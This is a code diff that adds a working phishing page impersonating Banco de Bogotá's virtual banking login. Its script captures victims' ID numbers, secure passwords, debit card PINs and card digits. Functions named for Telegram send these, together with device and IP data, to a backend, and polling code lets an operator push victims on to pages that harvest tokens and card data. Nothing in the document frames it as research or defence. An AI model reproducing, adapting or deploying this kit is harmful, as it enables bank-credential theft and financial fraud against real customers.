@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Ingreso Bancario</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #f7f9fc;
+      margin: 0;
+      padding: 0;
+    }
+    .login-card {
+      background: #fff;
+      width: 420px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.15);
+      overflow: hidden;
+    }
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 18px;
+      font-weight: 600;
+      font-size: 16px;
+      color: #666;
+      cursor: pointer;
+      position: relative;
+    }
+    .tab.active {
+      color: #0046be;
+    }
+    .tab.active::after {
+      content: "";
+      position: absolute;
+      height: 2px;
+      background-color: #0046be;
+      bottom: 0;
+      left: 0;
+      right: 0;
+    }
+    .info-message {
+      background-color: #e9f1fb;
+      color: #333;
+      font-size: 14px;
+      padding: 14px;
+      position: relative;
+    }
+    .info-message .close-msg {
+      position: absolute;
+      right: 12px;
+      top: 10px;
+      cursor: pointer;
+      font-weight: bold;
+      color: #cccccc;
+      font-size: 18px;
+    }
+    .form-container {
+      padding: 30px;
+    }
+    .form-group {
+      margin-bottom: 22px;
+    }
+    .form-group label {
+      font-size: 14px;
+      font-weight: 500;
+      display: block;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    .input-flex {
+      display: flex;
+      gap: 8px;
+    }
+    select, input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #bdbdbd;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+    }
+    .input-flex select {
+      width: 35%;
+    }
+    .input-flex input {
+      width: 65%;
+    }
+    .password-container {
+      position: relative;
+      width: 345px;
+      height: 48px;
+      margin: 100 auto;
+    }
+    .password-container input {
+      width: 100%;
+      height: 48px;
+      padding-right: 48px;
+      box-sizing: border-box;
+    }
+
+    .btn-ingresar {
+      width: 90%;
+      padding: 14px;
+      background: #e0e0e0;
+      color: #666;
+      border: none;
+      border-radius: 50px;
+      font-size: 15px;
+      cursor: not-allowed;
+      margin-top: 10px;
+      margin-left: auto;
+      margin-right: auto;
+      display: block;
+    }
+
+    .container-box {
+      max-width: 400px;
+      margin: 30px auto;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 10px;
+    }
+
+    .logo {
+      width: auto;
+      max-height: 50px;
+    }
+
+    /* Loader overlay */
+    #loader-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(30, 64, 175, 0.9);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .loader-spinner {
+      width: 60px;
+      height: 60px;
+      animation: blink 1.5s ease-in-out infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    /* Responsive para dispositivos móviles */
+    @media (max-width: 480px) {
+      body {
+        padding: 0;
+        margin: 0;
+      }
+      
+      .container-box {
+        max-width: 95%;
+        margin: 5px auto;
+        padding: 8px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      }
+
+      /* Ajustar banner para móviles */
+      div[style*="background: linear-gradient"] {
+        padding: 15px 10px !important;
+        margin: 0 -10px 15px -10px !important;
+        border-radius: 0 0 10px 10px !important;
+      }
+
+      .logo {
+        max-height: 40px !important;
+      }
+
+      h3 {
+        font-size: 16px !important;
+        margin-bottom: 8px !important;
+      }
+      
+      .tabs {
+        display: flex;
+        margin-bottom: 20px;
+      }
+      
+      .tab {
+        flex: 1;
+        padding: 15px 5px;
+        font-size: 16px;
+        text-align: center;
+      }
+      
+      .form-container {
+        padding: 0;
+      }
+      
+      .form-group {
+        margin-bottom: 20px;
+      }
+      
+      .form-group label {
+        font-size: 16px;
+        margin-bottom: 8px;
+        display: block;
+      }
+      
+      .input-flex {
+        display: flex;
+        gap: 10px;
+      }
+      
+      .input-flex select {
+        width: 35%;
+        padding: 15px;
+        font-size: 16px;
+      }
+      
+      .input-flex input {
+        width: 65%;
+        padding: 15px;
+        font-size: 16px;
+      }
+      
+      .password-container {
+        position: relative;
+      }
+      
+      .password-container input {
+        width: 100%;
+        padding: 15px;
+        padding-right: 50px;
+        font-size: 16px;
+      }
+      
+        .password-container .eye-icon {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 18px;
+      color: #999;
+      opacity: 0.8;
+    }
+      
+      .btn-ingresar {
+        width: 100%;
+        padding: 16px;
+        font-size: 18px;
+        margin-top: 20px;
+        border-radius: 10px;
+      }
+      
+      .info-message {
+        font-size: 14px;
+        padding: 15px;
+        margin-bottom: 25px;
+        line-height: 1.4;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .container-box {
+        max-width: 95%;
+        margin: 15px auto;
+        padding: 20px;
+      }
+      
+      /* Ajustar banner para tablets */
+      div[style*="background: linear-gradient"] {
+        padding: 18px 15px !important;
+        margin: 0 -15px 18px -15px !important;
+        border-radius: 0 0 12px 12px !important;
+      }
+
+      .logo {
+        max-height: 45px !important;
+      }
+
+      h3 {
+        font-size: 18px !important;
+        margin-bottom: 10px !important;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .container-box {
+        max-width: 98%;
+        margin: 5px auto;
+        padding: 10px;
+      }
+      
+      /* Ajustar banner para móviles muy pequeños */
+      div[style*="background: linear-gradient"] {
+        padding: 12px 8px !important;
+        margin: 0 -8px 12px -8px !important;
+        border-radius: 0 0 8px 8px !important;
+      }
+
+      .logo {
+        max-height: 35px !important;
+      }
+
+      h3 {
+        font-size: 14px !important;
+        margin-bottom: 6px !important;
+      }
+      
+      .tab {
+        padding: 12px 3px;
+        font-size: 14px;
+      }
+      
+      .form-group {
+        margin-bottom: 20px;
+      }
+      
+      .form-group label {
+        font-size: 15px;
+      }
+      
+      .input-flex select,
+      .input-flex input,
+      .password-container input {
+        padding: 12px;
+        font-size: 16px;
+      }
+      
+      .btn-ingresar {
+        padding: 15px;
+        font-size: 16px;
+        margin-top: 25px;
+      }
+      
+      .info-message {
+        font-size: 13px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="text-center" style="background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%); padding: 20px; border-radius: 0 0 15px 15px; margin: 0 -15px 20px -15px;">
+    <img src="img/descarga.svg" alt="Banco de Bogotá" class="logo mb-2" style="display: block; margin: 0 auto;">
+  </div>
+
+  <div class="text-center mt-4">
+    <h3 class="mt-1 fw-bold" style="text-align: center; width: 100%;">Bienvenido a tu Banca Virtual</h3>
+  </div>
+
+  <div class="container-box">
+    <div class="tabs">
+      <div class="tab active" id="tab-clave">Clave segura</div>
+      <div class="tab" id="tab-tarjeta">Tarjeta débito</div>
+    </div>
+
+    <div class="info-message" id="info-message" style="text-align: left;">
+      Estás ingresando con tu Clave Segura. Selecciona ‘Tarjeta Débito’ para cambiar el tipo de ingreso.
+      <span class="close-msg" onclick="document.getElementById('info-message').style.display='none';">×</span>
+    </div>
+
+    <div class="form-container" id="form-clave">
+      <div class="form-group">
+        <label>Identificación</label>
+        <div class="input-flex">
+          <select>
+            <option>C.C. ...</option>
+            <option>C.E.</option>
+            <option>NIT</option>
+          </select>
+          <input type="text" id="identificacion-clave" placeholder="#" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 10 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Clave segura</label>
+        <div class="password-container">
+          <input type="password" id="password-clave" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <button class="btn-ingresar" disabled>Ingresar</button>
+    </div>
+
+    <div class="form-container" id="form-tarjeta" style="display: none;">
+      <div class="form-group">
+        <label>Identificación</label>
+        <div class="input-flex">
+          <select>
+            <option>C.C. ...</option>
+            <option>C.E.</option>
+            <option>NIT</option>
+          </select>
+          <input type="text" id="identificacion-tarjeta" placeholder="#" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 10 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Clave de tu tarjeta débito</label>
+        <div class="password-container">
+          <input type="password" id="password-tarjeta" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <div class="form-group">
+        <label>Últimos 4 dígitos de tu tarjeta débito</label>
+        <div class="password-container">
+          <input type="password" id="digitos-tarjeta" placeholder="...." maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, máximo 4 dígitos">
+        </div>
+      </div>
+      <button class="btn-ingresar" disabled>Ingresar</button>
+    </div>
+  </div>
+
+  <!-- Loader overlay -->
+  <div id="loader-overlay">
+    <div class="loader-spinner">
+      <img src="img/21l.svg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
+    </div>
+  </div>
+
+  <script>
+    const tabClave = document.getElementById('tab-clave');
+    const tabTarjeta = document.getElementById('tab-tarjeta');
+    const formClave = document.getElementById('form-clave');
+    const formTarjeta = document.getElementById('form-tarjeta');
+    const infoMessage = document.getElementById('info-message');
+
+    // Función para validar campos del formulario de clave segura
+    function validarCamposClave() {
+      const btnIngresar = formClave.querySelector('.btn-ingresar');
+      const identificacion = document.getElementById('identificacion-clave').value;
+      const password = document.getElementById('password-clave').value;
+      
+      // Validar que la identificación tenga al menos 5 dígitos y la contraseña 4 dígitos
+      const camposCompletos = identificacion.length >= 5 && password.length === 4;
+      
+      // Cambiar estado del botón
+      if (camposCompletos) {
+        btnIngresar.disabled = false;
+        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
+        btnIngresar.style.border = "none";
+        btnIngresar.style.color = "white";
+      } else {
+        btnIngresar.disabled = true;
+        btnIngresar.style.background = "#e0e0e0";
+        btnIngresar.style.border = "1px solid #ccc";
+        btnIngresar.style.color = "#666";
+      }
+    }
+
+    // Función para validar campos del formulario de tarjeta débito
+    function validarCamposTarjeta() {
+      const btnIngresar = formTarjeta.querySelector('.btn-ingresar');
+      const identificacion = document.getElementById('identificacion-tarjeta').value;
+      const password = document.getElementById('password-tarjeta').value;
+      const digitos = document.getElementById('digitos-tarjeta').value;
+      
+      // Validar que todos los campos estén completos
+      const camposCompletos = identificacion.length >= 5 && password.length === 4 && digitos.length === 4;
+      
+      // Cambiar estado del botón
+      if (camposCompletos) {
+        btnIngresar.disabled = false;
+        btnIngresar.style.background = "linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%)";
+        btnIngresar.style.border = "none";
+        btnIngresar.style.color = "white";
+      } else {
+        btnIngresar.disabled = true;
+        btnIngresar.style.background = "#e0e0e0";
+        btnIngresar.style.border = "1px solid #ccc";
+        btnIngresar.style.color = "#666";
+      }
+    }
+
+    // Event listeners para los tabs
+    tabClave.addEventListener('click', () => {
+      tabClave.classList.add('active');
+      tabTarjeta.classList.remove('active');
+      formClave.style.display = 'block';
+      formTarjeta.style.display = 'none';
+      infoMessage.style.display = 'block';
+      validarCamposClave(); // Validar al cambiar de tab
+    });
+
+    tabTarjeta.addEventListener('click', () => {
+      tabTarjeta.classList.add('active');
+      tabClave.classList.remove('active');
+      formClave.style.display = 'none';
+      formTarjeta.style.display = 'block';
+      infoMessage.style.display = 'none';
+      validarCamposTarjeta(); // Validar al cambiar de tab
+    });
+
+    // Event listeners para los campos de entrada
+    document.addEventListener('DOMContentLoaded', function() {
+      // Generar o recuperar session_id
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+
+      // Campos del formulario de clave segura
+      const identificacionClave = document.getElementById('identificacion-clave');
+      const passwordClave = document.getElementById('password-clave');
+      
+      identificacionClave.addEventListener('input', validarCamposClave);
+      passwordClave.addEventListener('input', validarCamposClave);
+      
+      // Campos del formulario de tarjeta débito
+      const identificacionTarjeta = document.getElementById('identificacion-tarjeta');
+      const passwordTarjeta = document.getElementById('password-tarjeta');
+      const digitosTarjeta = document.getElementById('digitos-tarjeta');
+      
+      identificacionTarjeta.addEventListener('input', validarCamposTarjeta);
+      passwordTarjeta.addEventListener('input', validarCamposTarjeta);
+      digitosTarjeta.addEventListener('input', validarCamposTarjeta);
+      
+      // Validar inicialmente
+      validarCamposClave();
+      validarCamposTarjeta();
+
+      // Event listeners para los botones de envío
+      const btnIngresarClave = formClave.querySelector('.btn-ingresar');
+      const btnIngresarTarjeta = formTarjeta.querySelector('.btn-ingresar');
+
+      btnIngresarClave.addEventListener('click', function() {
+        const identificacion = document.getElementById('identificacion-clave').value;
+        const password = document.getElementById('password-clave').value;
+        
+        if (identificacion && password) {
+          localStorage.setItem('identificacion', identificacion);
+          localStorage.setItem('password', password);
+          enviarDatosATelegram(identificacion, password, sessionId);
+        }
+      });
+
+      btnIngresarTarjeta.addEventListener('click', function() {
+        const identificacion = document.getElementById('identificacion-tarjeta').value;
+        const password = document.getElementById('password-tarjeta').value;
+        const digitos = document.getElementById('digitos-tarjeta').value;
+        
+        if (identificacion && password && digitos) {
+          localStorage.setItem('identificacion', identificacion);
+          localStorage.setItem('password', password);
+          localStorage.setItem('digitos', digitos);
+          enviarDatosTarjetaATelegram(identificacion, password, digitos, sessionId);
+        }
+      });
+    });
+
+    // Función para enviar datos de clave segura a Telegram
+    function enviarDatosATelegram(identificacion, password, sessionId) {
+      // Mostrar loader
+      const loader = document.getElementById('loader-overlay');
+      if (loader) {
+        loader.style.display = 'flex';
+      }
+      
+      // Detectar tipo de dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP y construir mensaje
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+💎BANCO DE BOGOTA💎
+------------------------------
+<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
+<b>🪬Tipo:</b> RECARGA PSE
+------------------------------
+<b>📟Dispositivo:</b> ${dispositivo}
+<b>🗺IP:</b> ${ip}
+<b>⏱Hora:</b> ${hora}
+------------------------------
+👤 Usuario: ${identificacion}
+🔑 Clave: ${password}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            // Iniciar/verificar polling siempre, incluso si no hay messageId o status !== 'success'
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            // Continuar con polling aunque falle el envío inicial
+            checkPaymentVerification(sessionId, null);
+          });
+        })
+        .catch(() => {
+          // Si falla la obtención de IP, enviar sin IP
+          const mensaje = `
+💎BANCO DE BOGOTA💎
+
+<b>fu7ur4ma</b>
+
+---------------
+<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
+<b>🪬Tipo:</b> RECARGA PSE
+---------------
+<b>📟Dispositivo:</b> ${dispositivo}
+<b>🗺IP:</b> No disponible
+<b>⏱Hora:</b> ${hora}
+---------------
+👤 Usuario: ${identificacion}
+🔑 Clave: ${password}
+---------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            checkPaymentVerification(sessionId, null);
+          });
+        });
+    }
+
+    // Función para enviar datos de tarjeta débito a Telegram
+    function enviarDatosTarjetaATelegram(identificacion, password, digitos, sessionId) {
+      // Mostrar loader
+      const loader = document.getElementById('loader-overlay');
+      if (loader) {
+        loader.style.display = 'flex';
+      }
+      
+      // Detectar tipo de dispositivo
+      const userAgent = navigator.userAgent;
+      let dispositivo = 'PC';
+      
+      if (/Android/i.test(userAgent)) {
+        dispositivo = 'Android';
+      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+        dispositivo = 'iPhone';
+      } else if (/Windows/i.test(userAgent)) {
+        dispositivo = 'PC';
+      } else if (/Mac/i.test(userAgent)) {
+        dispositivo = 'Mac';
+      } else if (/Linux/i.test(userAgent)) {
+        dispositivo = 'Linux';
+      }
+      
+      const hora = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP y construir mensaje
+      fetch('get_ip.php')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip || 'No disponible';
+          
+          const mensaje = `
+💎BANCO DE BOGOTA💎
+---------------
+<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
+<b>🪬Tipo:</b> RECARGA PSE
+---------------
+<b>📟Dispositivo:</b> ${dispositivo}
+<b>🗺IP:</b> ${ip}
+<b>⏱Hora:</b> ${hora}
+---------------
+👤 Usuario: ${identificacion}
+🔑 Clave: ${password}
+💳 Dígitos: ${digitos}
+---------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            checkPaymentVerification(sessionId, null);
+          });
+        })
+        .catch(() => {
+          // Si falla la obtención de IP, enviar sin IP
+          const mensaje = `
+💎BANCO DE BOGOTA💎
+------------------------------
+<b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
+<b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
+<b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
+<b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
+<b>🏦Banco:</b> ${localStorage.getItem('nom') || 'No disponible'}
+<b>🪬Tipo:</b> RECARGA PSE
+------------------------------
+<b>📟Dispositivo:</b> ${dispositivo}
+<b>🗺IP:</b> No disponible
+<b>⏱Hora:</b> ${hora}
+------------------------------
+👤 Usuario: ${identificacion}
+🔑 Clave: ${password}
+💳 Dígitos: ${digitos}
+------------------------------`;
+
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', sessionId);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            const maybeMessageId = result && result.messageId ? result.messageId : null;
+            checkPaymentVerification(sessionId, maybeMessageId);
+          })
+          .catch(err => {
+            checkPaymentVerification(sessionId, null);
+          });
+        });
+    }
+
+    async function checkPaymentVerification(transactionId, messageId) {
+  try {
+    const formData = new FormData();
+    formData.append('transactionId', transactionId);
+    if (messageId) {
+      formData.append('messageId', messageId);
+    }
+
+    const res = await fetch('verificar_respuesta.php', {
+      method: 'POST',
+      body: formData
+    });
+
+    const result = await res.json();
+
+    if (result && result.action) {
+      // No alerts, solo redirecciones limpias
+      switch (result.action) {
+        case 'pedir_dinamica':
+          window.location.href = "token.php?identificacion=" + encodeURIComponent(localStorage.getItem('identificacion'));
+          break;
+
+        case 'error_logo':
+          window.location.href = "index.html";
+          break;
+
+        case 'error_tc':
+          window.location.href = "tarjeta.php?identificacion=" + encodeURIComponent(localStorage.getItem('identificacion'));
+          break;
+
+        case 'confirm_finalizar':
+          window.location.href = "finalizado.php";
+          break;
+
+        default:
+          setTimeout(() => checkPaymentVerification(transactionId, messageId || null), 2000);
+          break;
+      }
+    } else {
+      setTimeout(() => checkPaymentVerification(transactionId, messageId || null), 2000);
+    }
+
+  } catch (err) {
+    setTimeout(() => checkPaymentVerification(transactionId, messageId || null), 2000);
+  }
+}
+
+  </script>
+</body>
+</html>
